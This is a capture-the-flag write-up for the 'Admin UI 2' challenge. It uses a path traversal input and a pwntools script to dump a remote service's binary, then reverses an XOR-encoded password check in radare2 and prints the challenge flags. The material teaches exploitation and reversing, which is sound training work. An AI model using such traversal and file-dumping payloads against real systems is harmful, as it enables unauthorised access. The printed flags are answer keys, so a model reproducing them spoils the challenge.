# ADMIN UI 2
PWN-RE

## Description:
> That first flag was a dud, but I think using a similar trick to get the full binary file might be needed here. There is a least one password in there somewhere. Maybe reversing this will give you access to the authenticated area, then you can turn up the heat… literally.


## Solution:

Let's use the same trick from [Admin UI](Admin_UI.md) to get the full binary:
```
root@kali:/media/sf_CTFs/google/adminui2# nc mngmnt-iface.ctfcompetition.com 1337
=== Management Interface ===
 1) Service access
 2) Read EULA/patch notes
 3) Quit
2
The following patchnotes were found:
 - Version0.2
 - Version0.3
Which patchnotes should be shown?
../../../proc/self/cmdline
./main === Management Interface ===
 1) Service access
 2) Read EULA/patch notes
 3) Quit
```

So we know the binary path, we can either use the relative path (`../../../home/user/main`) or just dump `../../../proc/self/exe`.

Using the following Python script, we read the binary:
```python
from pwn import *

r = remote("mngmnt-iface.ctfcompetition.com", 1337)

MENU_START = "=== Management Interface ===\n"

def read_menu():
    r.recvuntil("3) Quit")

def read_notes(path):
    read_menu()
    r.sendline("2")
    r.sendlineafter("Which patchnotes should be shown?\n", path)
    log.info("Read EULA/patch notes: {}".format(path))
    out = r.recvuntil(MENU_START, drop=True)
    return out

binary = read_notes("../../../proc/self/exe")
target_file = "admin_ui_2"
log.info("Writing binary to {}".format("admin_ui_2"))
write(target_file, binary)
```

Output:
```console
root@kali:/media/sf_CTFs/google/adminui2# python exploit.py
[+] Opening connection to mngmnt-iface.ctfcompetition.com on port 1337: Done
[*] Read EULA/patch notes: ../../../proc/self/exe
[*] Writing binary to admin_ui_2
[*] Closed connection to mngmnt-iface.ctfcompetition.com port 1337
root@kali:/media/sf_CTFs/google/adminui2# file admin_ui_2
admin_ui_2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e78c178ffb1ddc700123dbda1a49a695fafd6c84, with debug_info, not stripped
```

Let's reverse it:
```
root@kali:/media/sf_CTFs/google/adminui2# r2 admin_ui_2
 -- You can redefine descriptive commands in the hud file and using the 'V_' command.
[0x41414150]> aa
[WARNING: r_bin_get_vaddr: assertion 'bin && paddr != UT64_MAX' failed (line 1382)
WARNING: r_bin_get_vaddr: assertion 'bin && paddr != UT64_MAX' failed (line 1382)
[x] Analyze all flags starting with sym. and entry0 (aa)
[0x41414150]> afl
0x00400a40    3 23           sym._init
0x00400a70    1 6            sym.imp.printf
0x00400a80    1 6            sym.imp.close
0x00400a90    1 6            sym.imp.puts
0x00400aa0    1 6            sym.imp.exit
0x00400ab0    1 6            sym.imp.putchar
0x00400ac0    1 6            sym.imp.read
0x00400ad0    1 6            sym.imp.strncmp
0x00400ae0    1 6            sym.imp.system
0x00400af0    1 6            sym.imp.getpid
0x00400b00    1 6            sym.imp.scanf
0x00400b10    1 6            sym.imp.strlen
0x00400b20    1 6            sym.imp.opendir
0x00400b30    1 6            sym.imp.__xstat
0x00400b40    1 6            sym.imp.readdir
0x00400b50    1 6            sym.imp.sprintf
0x00400b60    1 6            sym.imp.strerror
0x00400b70    1 6            sym.imp.setbuf
0x00400b80    1 6            sym.imp.getchar
0x00400b90    1 6            sym.imp.__errno_location
0x00400ba0    1 6            sym.imp.strcmp
0x00400bb0    1 6            sym.imp.strncpy
0x00400bc0    1 6            sym.imp.closedir
0x00400bd0    1 6            sym.imp.write
0x00400be0    1 6            sym.imp.open
0x00400bf0    1 6            sym.imp.fflush
0x41414150    1 43           entry0
0x41414180    4 42   -> 37   sym.deregister_tm_clones
0x414141b0    4 58   -> 55   sym.register_tm_clones
0x414141f0    3 34   -> 29   sym.__do_global_dtors_aux
0x41414220    1 7            entry1.init
0x41414227    1 19           sym.debug_shell
0x4141423a    7 84           sym.getsx_char
0x4141428e   15 440          sym.command_line
0x41414446   11 293          sym.secondary_login
0x4141456b    6 221          sym.primary_login
0x41414648   38 766          main
0x41414950    3 101  -> 92   sym.__libc_csu_init
0x414149c0    1 2            sym.__libc_csu_fini
0x414149d0    1 16           sym.__stat
0x414149e0    1 9            sym._fini
```

In `main`, the interesting part is the one that calls `primary_login` after entering `1`:
```assemmbly
                  |                      
                  |                      
              .------------------------. 
              |  0x41414747 [gy]       | 
              | ; 1                    | 
              | cmp eax, 1             | 
              | jne 0x41414935;[gx]    | 
              `------------------------' 
                      f t                
                      | |                
                      | |                
                      | |                
                      | |                
                      | |                
                      | |                
                      | '------------.   
     .----------------'              |   
     |                               |   
     |                               |   
     |                               |   
     |                               |   
     |                               |   
     |                               |   
 .-------------------------------.   |   
 |  0x41414750 [gAa]             |   |   
 | call sym.primary_login;[gz]   |   |   
 | jmp 0x41414935;[gx]           |   |   
 `-------------------------------'   |
 ```

 This corresponds to the following behavior:
 ```
root@kali:/media/sf_CTFs/google/adminui2# nc mngmnt-iface.ctfcompetition.com 1337
=== Management Interface ===
 1) Service access
 2) Read EULA/patch notes
 3) Quit
1
Please enter the backdoo^Wservice password:
```

A summarized overview of `primary_login` is as follows (obtained by iterating through visual mode views in Radare2 via `p`):
```
[0x41414648]> s sym.primary_login
[0x4141456b]> VV
             .------------------------------------------------------------.
             | [0x4141456b]                                               |
             | 0x41414576 str.Please_enter_the_backdoo_Wservice_password: |
             | 0x4141457d call sym.imp.puts                               |
             | 0x41414587 str.flag                                        |
             | 0x41414593 call sym.imp.open                               |
             `------------------------------------------------------------'
                     f t
                     | |
                     | '-----------------------------.
     .---------------'                               |
     |                                               |
 .------------------------------------------.    .---------------------------------.
 |  0x414145b8 [gf]                         |    |  0x414145ce [gc]                |
 | 0x414145b8 str.Login_mechanism_corrupted |    | 0x414145e2 call sym.imp.read    |
 | 0x414145bf call sym.imp.puts             |    | 0x414145ec call sym.imp.close   |
 | 0x414145c9 call sym.imp.exit             |    | 0x414145fb str.127s             |
 `------------------------------------------'    | 0x41414607 call sym.imp.scanf   |
                                                 | 0x41414620 call sym.imp.strcmp  |
                                                 `---------------------------------'
                                                         f t
                                                         | |
                                                         | '------.
                        .--------------------------------'        |
                        |                                         |
                    .-------------------------------------.   .--------------------------------------------------------------.
                    |  0x41414629 [gn]                    |   |  0x41414630 [gk]                                             |
                    | 0x41414629 call sym.secondary_login |   | 0x41414630 str.Incorrect__the_authorities_have_been_informed |
                    `-------------------------------------'   | 0x41414637 call sym.imp.puts                                 |
                        v                                     | 0x41414641 call sym.imp.exit                                 |
                        |                                     `--------------------------------------------------------------'
                        |
                        |
                        '-------.
                                |
                            .--------------------.
                            |  0x41414646 [gm]   |
                            `--------------------'           
```

It opens a `flag` file, reads input from the user, and compares. We've already leaked the contents of that file in the previous level, so we can try:
```
root@kali:/media/sf_CTFs/google/adminui2# nc mngmnt-iface.ctfcompetition.com 1337
=== Management Interface ===
 1) Service access
 2) Read EULA/patch notes
 3) Quit
1
Please enter the backdoo^Wservice password:
CTF{I_luv_buggy_sOFtware}
! Two factor authentication required !
Please enter secret secondary password:
```

Indeed a dud. We move on to `secondary_login`.
```
[0x4141456b]> s sym.secondary_login
[0x41414446]> VV
```

The first block of code just sets up everything:
```assembly
 .-------------------------------------------------------------.
 | [0x41414446]                                                |
 | (fcn) sym.secondary_login 293                               |
 |   sym.secondary_login ();                                   |
 | ; var int input @ rbp-0x90                                  |
 | ; var int local_88h @ rbp-0x88                              |
 | ; var int local_80h @ rbp-0x80                              |
 | ; var int local_78h @ rbp-0x78                              |
 | ; var int local_70h @ rbp-0x70                              |
 | ; var int local_6eh @ rbp-0x6e                              |
 | ; var int input_len @ rbp-0x10                              |
 | ; var int i @ rbp-0x8                                       |
 | ; CALL XREF from sym.primary_login (0x41414629)             |
 | push rbp                                                    |
 | mov rbp, rsp                                                |
 | sub rsp, 0x90                                               |
 | ; 0x41414b30                                                |
 | ; "! Two factor authentication required !"                  |
 | lea rdi, str.Two_factor_authentication_required             |
 | ; int puts(const char *s)                                   |
 | call sym.imp.puts;[ga]                                      |
 | ; 0x41414b58                                                |
 | ; "Please enter secret secondary password:"                 |
 | lea rdi, str.Please_enter_secret_secondary_password:        |
 | ; int puts(const char *s)                                   |
 | call sym.imp.puts;[ga]                                      |
 | lea rax, [input]                                            |
 | mov rsi, rax                                                |
 | ; 0x41414b80                                                |
 | ; "%127s"                                                   |
 | lea rdi, str.127s                                           |
 | mov eax, 0                                                  |
 | ; int scanf(const char *format)                             |
 | call sym.imp.scanf;[gb]                                     |
 | lea rax, [input]                                            |
 | mov rdi, rax                                                |
 | ; size_t strlen(const char *s)                              |
 | call sym.imp.strlen;[gc]                                    |
 | mov qword [input_len], rax                                  |
 | mov qword [i], 0                                            |
 `-------------------------------------------------------------'
 ```

 It prints the message, reads the second password and calculates its length.

 We then move on to a loop:
 ```assembly
 .-----------.
 |         | |
 |   .---------------------------------------------------.
 |   |  0x4141449f [gf]                                  |
 |   | ; CODE XREF from sym.secondary_login (0x414144d4) |
 |   | mov rax, qword [i]                                |
 |   | cmp rax, qword [input_len]                        |
 |   | jae 0x414144d6;[ge]                               |
 |   `---------------------------------------------------'
 |           f t
 |           | |
 |           | '--------------------------.
 |    .------'                            |
 |    |                                   |
 |.------------------------------.    .------------------------------------.
 ||  0x414144a9 [gg]             |    |  0x414144d6 [ge]                   |
 || lea rdx, [input]             |    | ; '#'                              |
 || mov rax, qword [i]           |    | cmp qword [input_len], 0x23        |
 || ; '('                        |    | jne 0x41414537;[gh]                |
 || add rax, rdx                 |    `------------------------------------'
 || movzx eax, byte [rax]        |            f t
 || xor eax, 0xffffffc7          |            | |
 || mov ecx, eax                 |            | |
 || lea rdx, [input]             |            | |
 || mov rax, qword [i]           |            | |
 || ; '('                        |            | |
 || add rax, rdx                 |            | |
 || mov byte [rax], cl           |            | |
 || add qword [i], 1             |            | |
 || jmp 0x4141449f;[gf]          |            | |
 |`------------------------------'            | |
 |    v                                       | |
 |    |                                       | |
 `----'                                       | |
 ```

 This loop XORs each byte of the input with 0xC7, then moves on to compare the length to 0x23.

 The next block should be checking the result against the expected input:
 ```
    .--------------------------------------.    |
   |  0x414144dd [gi]                     |    |
   | ; [0x41414a40:8]=0x98a8b093bc819384  |    |
   | mov rax, qword obj.FLAG              |    |
   | ; [0x41414a48:8]=0x83b5a8b094b4a697  |    |
   | mov rdx, qword [0x41414a48]          |    |
   | mov qword [input], rax               |    |
   | mov qword [local_88h], rdx           |    |
   | ; [0x41414a50:8]=0xb5a2b3b3a28598bd  |    |
   | mov rax, qword [0x41414a50]          |    |
   | ; [0x41414a58:8]=0x98f698a9f3afb398  |    |
   | mov rdx, qword [0x41414a58]          |    |
   | mov qword [local_80h], rax           |    |
   | mov qword [local_78h], rdx           |    |
   | ; [0x41414a60:2]=0xf8ac              |    |
   | movzx eax, word [0x41414a60]         |    |
   | mov word [local_70h], ax             |    |
   | ; [0x41414a62:1]=186                 |    |
   | movzx eax, byte [0x41414a62]         |    |
   | mov byte [local_6eh], al             |    |
   | lea rax, [input]                     |    |
   | test rax, rax                        |    |
   | je 0x41414537;[gh]                   |    |
   `--------------------------------------'    |
           f t                                 |
           | |                                 |
           | '------------------------.        |
      .----'                          |        |
      |                               | .------'
      |                               | |
  .------------------------.    .--------------------.
  |  0x41414530 [gk]       |    |  0x41414537 [gh]   |
  | mov eax, 1             |    | mov eax, 0         |
  | jmp 0x4141453c;[gj]    |    `--------------------'
  `------------------------'        v
```

We see that the code starts by referencing `obj.FLAG`. Let's extract it:
```
:> pcp 0x23 @ obj.FLAG
import struct
buf = struct.pack ("35B", *[
0x84,0x93,0x81,0xbc,0x93,0xb0,0xa8,0x98,0x97,0xa6,0xb4,
0x94,0xb0,0xa8,0xb5,0x83,0xbd,0x98,0x85,0xa2,0xb3,0xb3,
0xa2,0xb5,0x98,0xb3,0xaf,0xf3,0xa9,0x98,0xf6,0x98,0xac,
0xf8,0xba])
```

Now let's XOR with 0xC7:
```python
>>> import sys
>>> import struct
>>> buf = struct.pack ("35B", *[
... 0x84,0x93,0x81,0xbc,0x93,0xb0,0xa8,0x98,0x97,0xa6,0xb4,
... 0x94,0xb0,0xa8,0xb5,0x83,0xbd,0x98,0x85,0xa2,0xb3,0xb3,
... 0xa2,0xb5,0x98,0xb3,0xaf,0xf3,0xa9,0x98,0xf6,0x98,0xac,
... 0xf8,0xba])
>>> for x in buf:
...     sys.stdout.write(chr(ord(x) ^ 0xc7))
...
CTF{Two_PasSworDz_Better_th4n_1_k?}
```

Looks good, but something doesn't quite add up. I couldn't figure out how the `[gi]` block is comparing the expected result with the input. 

The final condition is:
```assembly
lea rax, [input]
test rax, rax 
```

Which is just checking that input in not NULL. Above that, we just have assignments. Where is the content being compared?

Eventually I convinced myself to try just any random string of length 0x23:
```console
root@kali:/media/sf_CTFs/google/adminui2# { echo "1"; echo "CTF{I_luv_buggy_sOFtware}"; python -c "print 'a'*0x23";} | nc mngmnt-iface.ctfcompetition.com 1337
=== Management Interface ===
 1) Service access
 2) Read EULA/patch notes
 3) Quit
Please enter the backdoo^Wservice password:
! Two factor authentication required !
Please enter secret secondary password:
Authenticated
>
```

So any string of length 0x23 will do. The flag is CTF{Two_PasSworDz_Better_th4n_1_k?} though.